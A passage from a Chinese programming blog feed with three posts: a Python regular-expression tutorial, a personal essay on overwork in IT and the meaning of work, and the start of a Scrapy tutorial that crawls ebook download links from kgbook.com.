        <content type="html"><![CDATA[<p>我们在做机器学习项目的时候，很大部分的精力都在做数据的整理，不管是用爬虫在网上爬取数据还是对已有的数据进行整理，往往需要对一些特定的字符串进行处理，正则表达式则是进行数据处理的利器。</p><h2 id="一、什么是正则表达式"><a href="#一、什么是正则表达式" class="headerlink" title="一、什么是正则表达式"></a>一、什么是正则表达式</h2><p>正则表达式，又称规则表达式,（Regular Expression，在代码中常简写为regex、regexp或RE），是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”），是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串，通常被用来检索、替换那些符合某个模式（规则）的文本。正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><p>简单来说，正则表达式就是使用：字符串定义规则，并通过规则去验证字符串是否匹配。<br>比如，验证一个字符串是否是符合条件的电子邮箱地址，只需要配置好正则规则，即可匹配任意邮箱。</p><p>比如通过正则规则： <code>(^[\w-]+(.[\w-]+)*@[\w-]+(.[\w-]+)+$)</code>  即可匹配一个字符串是否是标准邮箱格式。但如果不使用正则，使用if else来对字符串做判断就非常困难了。</p><h2 id="二、Python中如何使用正则表达式"><a href="#二、Python中如何使用正则表达式" class="headerlink" title="二、Python中如何使用正则表达式"></a>二、Python中如何使用正则表达式</h2><p>正则表达式的使用分两部分，一是编写模式（规则）文本，也就是正则表达式；二是通过具体的编程语言来使用正则表达式进行使用，在Python语言中通过re 模块使 Python 语言拥有全部的正则表达式功能。</p><h3 id="1、正则表达式模式的编写"><a href="#1、正则表达式模式的编写" class="headerlink" title="1、正则表达式模式的编写"></a>1、正则表达式模式的编写</h3><p>模式字符串使用特殊的语法来表示一个正则表达，由一些普通字符和一些元字符（metacharacters）组成。</p><p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。<br>多数字母和数字前加一个反斜杠时会拥有不同的含义。<br>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。<br>反斜杠本身需要使用反斜杠转义。</p><p>普通字符包括大小写的字母和数字，而元字符则具有特殊的含义，在最简单的情况下，一个正则表达式看上去就是一个普通的字符串。例如，正则表达式<code>&quot;xiejava&quot;</code>中没有包含任何元字符，它可以匹配<code>&quot;xiejava&quot;</code>和<code>&quot;xiejava1018&quot;</code>等字符串，但是不能匹配<code>&quot;XieJava&quot;</code>。</p><p>在刚刚我们只是进行了基础的字符串匹配，正则最强大的功能在于元字符匹配规则，常见的元字符匹配规则如下：</p><ul><li>单字符匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>.</td><td>匹配任意1个字符(除了\n) , .匹配点本身</td></tr><tr><td>[ ]</td><td>匹配[]中列举的字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9]</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\s</td><td>匹配任意空白字符，即空格、tab键，等价于 [\t\n\r\f]</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\w</td><td>匹配单词字符，即a-z、A-Z、0-9、</td></tr><tr><td>\W</td><td>匹配非单词字符</td></tr></tbody></table><ul><li>数量匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>匹配前一个规则的字符出现0至无数次</td></tr><tr><td>+</td><td>匹配前一个规则的字符出现1至无数次</td></tr><tr><td>？</td><td>匹配前一个规则的字符出现0次或1次</td></tr><tr><td>{m}</td><td>匹配前一个规则的字符出现m次</td></tr><tr><td>{m,}</td><td>匹配前一个规则的字符出现最少m次</td></tr><tr><td>{m,n}</td><td>匹配前一个规则的字符出现m到n次</td></tr></tbody></table><ul><li>边界匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td></tr><tr><td>\b</td><td>匹配一个单词的边界</td></tr><tr><td>\B</td><td>匹配非单词边界</td></tr></tbody></table><ul><li>分组匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>|</td><td>匹配左右任意一个表达式</td></tr><tr><td>（）</td><td>将括号中字符作为一个分组</td></tr></tbody></table><p><strong>示例：</strong><br>匹配账号，只能由字母和数字组成，长度限制6到10位<br>规则为： <code>[0-9a-zA-Z]{6, 10}$</code></p><p>匹配QQ号，要求纯数字，长度4-10，第一位不为0<br>规则为：<code>[1-9][0-9]{4, 10}</code><br>[1-9]匹配第一位，[0-9]匹配后面4到10位</p><p>匹配邮箱地址，只允许qq、163、189这三种邮箱地址<br>规则为：<code>[a-zA-Z0-9_.]+@[qq|163|189]+[.a-zA-Z]+</code></p><h3 id="2、Python中re模块的基础使用"><a href="#2、Python中re模块的基础使用" class="headerlink" title="2、Python中re模块的基础使用"></a>2、Python中re模块的基础使用</h3><p>Python中re模块常用的正则表达式包括以下四个主要方法：</p><ul><li><strong>使用match()进行准确匹配</strong><br>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">account_pattern=<span class="string">'^[0-9a-zA-Z]&#123;6,9&#125;$'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'xiejava1018'</span></span><br><span class="line">account_str2=<span class="string">'xiejava'</span></span><br><span class="line">account_str3=<span class="string">'xie'</span></span><br><span class="line"></span><br><span class="line">result1=re.match(account_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(account_pattern,account_str2)</span><br><span class="line">print(result2)</span><br><span class="line">result3=re.match(account_pattern,account_str3)</span><br><span class="line">print(result3)</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'xiejava'</span>&gt;</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>匹配成功 re.match 方法返回一个匹配的对象，否则返回 None。<br>我们可以使用 group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group())</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiejava</span><br></pre></td></tr></table></figure><ul><li><strong>使用search()首次匹配查找</strong><br>match()方法是从字符串的开头开始匹配，一旦起始位置不匹配，match() 就返回 none，整个匹配就失败了，它更适合用来检验某个字符串是否符合某个正则表达式的规则。常用来做格式的校验。如要实现在一段文本中查找符合正则表达式的字符串，可以用re.search()，它扫描整个字符串并返回第一个成功的匹配。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qq_pattern = <span class="string">'[1-9][0-9]&#123;4,10&#125;'</span></span><br><span class="line"></span><br><span class="line">qq_str1=<span class="string">'我的QQ号是:4002692和3641250'</span></span><br><span class="line"></span><br><span class="line">result_qq_match=re.match(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_match)</span><br><span class="line">result_qq_search=re.search(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_search)</span><br><span class="line"><span class="keyword">if</span> result_qq_search:</span><br><span class="line">    print(result_qq_search.group())</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">7</span>, <span class="number">14</span>), match=<span class="string">'4002692'</span>&gt;</span><br><span class="line"><span class="number">4002692</span></span><br></pre></td></tr></table></figure><p>在这可以看出，match()因为是起始位置匹配所以QQ号4002692没有匹配上，而search()它是扫描整个字符串找到第一个匹配成功的就返回了，实际上在这个例子中还有个3641250的QQ号。如果要找到所有的匹配就要用到re.findall()方法了。</p><ul><li><strong>使用findall()所有匹配查找</strong><br>findall()在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果有多个匹配模式，则返回元组列表，如果没有找到匹配的，则返回空列表。<br>注意： match 和 search 是匹配一次 findall 匹配所有。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result_qq_findall=re.findall(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_findall)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'4002692'</span>, <span class="string">'3641250'</span>]</span><br></pre></td></tr></table></figure><p>可以看到通过re.findall()方法匹配到了两个QQ号。</p><ul><li><strong>使用sub()匹配替换</strong><br>在做数据处理的时候，经常碰到的场景是找到某个匹配项，替换成一个新的字符串。这时就可以用到re.sub()进行匹配替换了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">email_pattern=<span class="string">'[a-zA-Z0-9_\.]+@[qq|163|189]+[\.a-zA-Z]+'</span></span><br><span class="line">email_str1=<span class="string">'我的email是：xiejava@qq.com、xiejava1018@163.com、xiejava@189.com、xiejava@sohu.com'</span></span><br><span class="line">result_email_findall=re.findall(email_pattern,email_str1)</span><br><span class="line">print(result_email_findall)</span><br><span class="line">email_str2=re.sub(<span class="string">'[a-zA-Z0-9_\.]+@'</span>,<span class="string">'****@'</span>,email_str1)</span><br><span class="line">print(email_str2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'xiejava@qq.com'</span>, <span class="string">'xiejava1018@163.com'</span>, <span class="string">'xiejava@189.com'</span>]</span><br><span class="line">我的email是：****@qq.com、****@<span class="number">163.</span>com、****@<span class="number">189.</span>com、****@sohu.com</span><br></pre></td></tr></table></figure><p>在这里可以看到，我们通过re.findall()匹配到了qq、163、189的邮箱。通过re.sub()将所有的邮箱的账号匹配后替换成了****进行脱敏处理。</p><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：</p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>re.I</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L</td><td>做本地化识别（locale-aware）匹配</td></tr><tr><td>re.M</td><td>多行匹配，影响 ^ 和 $</td></tr><tr><td>re.S</td><td>使 . 匹配包括换行在内的所有字符</td></tr><tr><td>re.U</td><td>根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td></tr><tr><td>re.X</td><td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td></tr></tbody></table><p>使用实例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match_pattern=<span class="string">'xiejava'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'XieJava is xiejava'</span></span><br><span class="line">result1=re.match(match_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(match_pattern,account_str1,re.I)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'XieJava'</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到在没有指定re.I的时候没有匹配到XieJava，指定re.I后使匹配对大小写不敏感，可以匹配到Xiejava</p><h2 id="三、正则表达式的应用"><a href="#三、正则表达式的应用" class="headerlink" title="三、正则表达式的应用"></a>三、正则表达式的应用</h2><p>给定一个正则表达式和另一个字符串，我们可以达到如下的目的：</p><ol><li><p>判断给定的字符串是否符合正则表达式的过滤逻辑（称作“匹配”）<br>应用场景为格式效验，如身份证、Email、手机号码的数据效验等。</p></li><li><p>可以通过正则表达式，从字符串中获取我们想要的特定部分<br>应用场景如：爬虫程序爬取数据时进行信息的提取，从文本中提取特定的部分。</p></li><li><p>可以通过正则表示式进行查找替换，将字符串中符合匹配条件的项替换成特定的字符<br>应用场景如：机器学习中的数据清洗整理，将某些数据进行查找替换等。</p></li></ol><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连续加班几个月，放假还要带电脑，我在思考工作的意义</title>
      <link href="/posts/3cd9fb5d/"/>
      <url>/posts/3cd9fb5d/</url>
      
        <content type="html"><![CDATA[<p>对于了解IT这个行业的人来说，这个行业的内卷程度超乎了大家的想像，工作真的很累，加班已经成为整个行业的标签。不管是去哪里笔记本电脑都得随身带，就像随时待命的特种兵，接到命令随时马上要展开战斗。有的时候在系统出事或者需求比较紧急的时候，无论哪里都会成为工作场所，可能旅游景点、可能是商场、可能是高铁地铁上、也有可能是路边……</p><p>在线系统出bug了他们就是救火员！想必很多人都经历过系统上线后匆忙处理bug，这种时候，就不分周末还是工作日了，更不管白天还是黑夜干就对了！有网友分享了这“经典”的一幕，一天晚上9点多，北京地铁某号线上，这位网友刚下站就看见一个小伙子蹲坐在一个隐蔽的角落，旁边地上放着双肩包，屏幕亮着，小伙正在专心地敲代码。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230930/%E7%A8%8B%E5%BA%8F%E5%91%98%E8%B7%AF%E8%BE%B9%E6%95%B2%E4%BB%A3%E7%A0%81%E6%94%B9bug.png" alt="程序员路边敲代码改bug"></p><p>作为IT从业者深刻感受到行业之卷，而对于运营商中搞网络安全的从业人员来说那更是“卷王之王”。各种实战演练活动、各种重保活动、安全运营监控值守、各种突发事件应急处置等。连续加班了好几个月，到了国庆假期还得要带上笔记本电脑，生怕有电话进来，基本上没有什么生活质量可言。这段时间，每天早上起床的第一件事就是问自己“<strong>这就是我想要的生活吗？</strong>”，为此我在思考和寻找工作的意义。</p><p>人的本性是趋利避害的，工作这事，本身是违背人本性的——无论什么工作，只要是投入劳力与时间换取物质资料，但在这个时代，工作又是人类最高效的自我满足手段——物质和精神，都是如此。</p><p>在《商业模式新生代-个人篇》介绍了工作的四种意义：</p><ul><li><p>工作是谋生手段<br>它意味着为了收入而工作，不涉及多少个人因素或满足感。工作即一种实用性活动，就是说完成某事的主要目的是为了得到另一件事。当然作为谋生手段的工作也能产生宝贵的技能和满足感，但其主要目的还是为工作者提供生存基础以追求生活中其他方面的意识。</p></li><li><p>工作是发展方向<br>将工作视为职业，这种观点的前提是工作者的动力源自对成功、成就和身份地位的渴望。此类工作者对工作的态度并不是热情眷恋，而是强调努力工作对自我的回馈，对职业型工作者来说，工作是一种创造、定义、表达、证明和美化自我的方式。将工作视为发展方向是实现人生意义和获得满足感的一个重要来源。</p></li><li><p>工作是使命召唤<br>“天职”这个词源自“天将降大任于斯人也”这一理念。这种“天意”可以是外在动力，如上帝的旨意或社区的需要；也可以是内在动力，如需要向世人展现的天赋使命。这种工作强调的是“个人的义务、责任或使命”。在那个激情燃烧的时代，为社会主义事业奋斗终生是我们的使命召唤；在百年未有之大变局的新时代，突破高科技技术封锁，实现中华民族的伟大复兴是我们的使命召唤。</p></li><li><p>工作是自我实现<br>它一方面体现了工作高度强调兴趣驱动的特征，另一方面淡化了咄咄逼人的“天命”特征。追求自我实现的工作者会选择不同寻常的职业道路，这些选择强调的是个人兴趣而非经济回报或名声威望。这种思考方式也是获得人生意义的一个重要来源。视工作为“自我实现”的人相对来说工作生活更为平衡，他们可以在工作中实现更多的人生意义，同时也不会牺牲家庭欢乐和其他方面的兴趣。</p></li></ul><p><strong>工作对不同的人来说具有不同的意义，工作的意义在很大程度上决定着“我是谁”这个命题的答案。</strong></p><ul><li><p>工作只是生活的手段，享受生活才是目的<br>工作是为了更好的生活，它的本质是交换，我们付出时间、经验，换取一部分我们想要的生活自由。我们已经很幸运，大部分的人都能有一份安稳的工作作为谋生手段。不要在谋生的地方找意义，生活才是实现意义的地方。</p></li><li><p>工作之外的你，才是真正不可替代的<br>我们这一生扮演的很多角色都是不可替代的，贴心的朋友、孝顺的子女、操心的家长。唯独工作是可以被替代的，如果你不干这些工作，依然有会有人干。与其把时间都投入到工作中内卷、焦虑、失眠，不如多花时间陪伴家人和朋友。 下班后该玩儿就玩儿，就陪家人就陪家人，把精力分散，而不是用下班时间去焦虑工作，还把这种内耗带到家里。你去运动、去做饭、去旅游、去亲近自然、去看一看花开日落、去体会一下风土人情。</p></li></ul><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫框架实战</title>
      <link href="/posts/dfc313ee/"/>
      <url>/posts/dfc313ee/</url>
      
        <content type="html"><![CDATA[<p>Python实现爬虫是很容易的，一般来说就是获取目标网站的页面，对目标页面的分析、解析、识别，提取有用的信息，然后该入库的入库，该下载的下载。以前写过一篇文章<a href="http://xiejava.ishareread.com/posts/eab21fe5/" target="_blank" rel="noopener">《Python爬虫获取电子书资源实战》</a>，以一个电子书的网站为例来实现python爬虫获取电子书资源。爬取整站的电子书资源，按目录保存到本地，并形成索引文件方便查找。这次介绍通过Scrapy爬虫框架来实现同样的功能。</p><h2 id="一、Scrapy简介"><a href="#一、Scrapy简介" class="headerlink" title="一、Scrapy简介"></a>一、Scrapy简介</h2><p>Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。<br>Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。<br>通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/1-scrapy%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt="Scrapy爬虫框架"></p><ul><li>Scrapy Engine(引擎)：负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。</li><li>Scheduler(调度器)：它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</li><li>Downloader(下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理，</li><li>Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).</li><li>Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。</li><li>Downloader Middlewares（下载中间件）：可以当作是一个可以自定义扩展下载功能的组件。</li><li>Spider Middlewares（Spider中间件）：可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）</li></ul><h2 id="二、Scrapy实战"><a href="#二、Scrapy实战" class="headerlink" title="二、Scrapy实战"></a>二、Scrapy实战</h2><p>虽然用python写一个爬虫也不是很费事，但是有了Scrapy以后让你实现爬虫更简单，更加通用，现在我们还是以《Python爬虫获取电子书资源实战》中的例子，爬取目标网站kgbook.com。也可以对比看一下通过Scrapy爬虫框架实现相同的功能有多么的方便。</p><h3 id="1、Scrapy安装"><a href="#1、Scrapy安装" class="headerlink" title="1、Scrapy安装"></a>1、Scrapy安装</h3><p>首先通过 pip 安装 Scrapy 框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scrapy</span><br></pre></td></tr></table></figure><h3 id="2、创建Scrapy项目工程"><a href="#2、创建Scrapy项目工程" class="headerlink" title="2、创建Scrapy项目工程"></a>2、创建Scrapy项目工程</h3><p>创建getbooks的项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject getbooks</span><br></pre></td></tr></table></figure><p>创建一个getkgbook的爬虫，目标网站kgbook.com</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider getkgbook kgbook.com</span><br></pre></td></tr></table></figure><p>项目的结构如下图所示</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/2-scrapy%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="Scrapy项目目录结构"></p><h3 id="3、实现Scrapy的爬虫代码"><a href="#3、实现Scrapy的爬虫代码" class="headerlink" title="3、实现Scrapy的爬虫代码"></a>3、实现Scrapy的爬虫代码</h3><h4 id="爬数据"><a href="#爬数据" class="headerlink" title="爬数据"></a>爬数据</h4><p>主要的爬虫逻辑实现代码都在getkgbook.py中，在这里实现目录的爬取、翻页、进入到详情页，并解析详情页的数据。<br>getkgbook.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> getbooks.items <span class="keyword">import</span> KgbookItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetkgbookSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"getkgbook"</span>  <span class="comment">#爬虫的名称</span></span><br><span class="line">    allowed_domains = [<span class="string">"kgbook.com"</span>]   <span class="comment">#爬取的网站</span></span><br><span class="line">    start_urls = [<span class="string">"https://kgbook.com"</span>]  <span class="comment">#爬取的首页</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        categorys = response.xpath(<span class="string">'//div[@id="category"]/div/ul/li/a'</span>)</span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categorys:</span><br><span class="line">            category_url = category.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">            url=response.urljoin(category_url)</span><br><span class="line">            <span class="comment">#爬取进入到目录页</span></span><br><span class="line">            <span class="keyword">yield</span> response.follow(url, self.parse_booklist) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析目录页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_booklist</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        book_list_select=response.css(<span class="string">'.channel-item h3.list-title a'</span>)</span><br><span class="line">        <span class="comment">#获取书籍列表</span></span><br><span class="line">        <span class="keyword">for</span> book_info_select <span class="keyword">in</span> book_list_select:</span><br><span class="line">            book_name=book_info_select.css(<span class="string">'::text'</span>).extract_first()</span><br><span class="line">            book_detail_url=book_info_select.css(<span class="string">'::attr(href)'</span>).extract_first()</span><br><span class="line">            book_detail_url=response.urljoin(book_detail_url)</span><br><span class="line">            print(book_name,book_detail_url)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=book_detail_url, callback=self.pase_bookdetail)</span><br><span class="line">        <span class="comment">#翻页</span></span><br><span class="line">        nextpage_url = response.xpath(<span class="string">'//div[@class="pagenavi"]/a[contains(text(), "下一页")]/@href'</span>).extract_first()</span><br><span class="line">        <span class="keyword">if</span> nextpage_url:</span><br><span class="line">            <span class="keyword">yield</span> response.follow(nextpage_url, self.parse_booklist)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析详情页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pase_bookdetail</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        navegate=response.xpath(<span class="string">'//nav[@id="location"]/a'</span>)</span><br><span class="line">        <span class="keyword">if</span> len(navegate)&gt;<span class="number">1</span>:</span><br><span class="line">            book_category=navegate[<span class="number">1</span>].xpath(<span class="string">'./text()'</span>).extract_first()</span><br><span class="line">        book_name=response.css(<span class="string">'.news_title::text'</span>).extract_first()</span><br><span class="line">        book_author=response.xpath(<span class="string">'//div[@id="news_details"]/ul/li[contains(text(),"作者")]/text()'</span>).extract_first()</span><br><span class="line">        pattern=re.compile(<span class="string">'mobi|epub|azw3|pdf'</span>,re.I) <span class="comment">#解析书籍的类型</span></span><br><span class="line">        book_download_urls=response.xpath(<span class="string">'//div[@id="introduction"]/a[@class="button"]'</span>)</span><br><span class="line">        <span class="keyword">for</span> book_download_urlinfo <span class="keyword">in</span> book_download_urls:</span><br><span class="line">            book_type=book_download_urlinfo.re(pattern)</span><br><span class="line">            <span class="keyword">if</span> book_type:</span><br><span class="line">                book_download_url=book_download_urlinfo.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">                <span class="comment">#获取要下载的书籍的名称、作者、要保存的路径、下载地址</span></span><br><span class="line">                item=KgbookItem()</span><br><span class="line">                item[<span class="string">'book_name'</span>]=book_name</span><br><span class="line">                item[<span class="string">'book_author'</span>]=book_author</span><br><span class="line">                item[<span class="string">'book_file'</span>]=os.path.join(book_category,book_name+<span class="string">"."</span>+str(book_type[<span class="number">0</span>]).lower())</span><br><span class="line">                item[<span class="string">'book_url'</span>]=book_download_url</span><br><span class="line">                print(book_name,book_author,book_download_url,item[<span class="string">'book_file'</span>])</span><br><span class="line">                <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>在这里我们通过xpath解析器和css解析器来解析获取网页中的有用的信息。如提取a 标签的href的信息 ，提取书籍的名称、作者、下载链接等信息。</p><h4 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h4><p>item.py<br>在item.py中定义了KgbookItem类，Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。在这里定义了book_name、book_author、book_file、book_url这些信息都会通过爬虫提取后保存用来输出到文件或数据库等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 